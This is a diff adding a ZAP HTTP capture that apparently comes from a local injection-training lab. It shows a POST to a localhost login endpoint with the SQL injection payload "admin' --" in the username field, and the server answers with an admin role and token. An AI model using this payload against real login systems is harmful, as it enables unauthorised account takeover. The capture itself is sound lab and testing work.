@@ -1,0 +1,22 @@
+### A03_lab_v1_1_login_bypass
+# ZAP history id: 9
+
+POST http://localhost:5001/api/login HTTP/1.1
+Host: localhost:5001
+User-Agent: python-requests/2.34.2
+Accept: */*
+Connection: keep-alive
+Content-Length: 42
+Content-Type: application/json
+
+{"username": "admin' --", "password": "x"}
+
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.2 Python/3.12.3
+Date: Wed, 18 Nov 2026 11:51:13 GMT
+Content-Type: application/json
+Content-Length: 182
+Connection: close
+
+{"role":"admin","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.701cOIcb9XlhgLmEZkiIoo4dapOqyDuwoEKokL5sumk","user":"admin"}
+
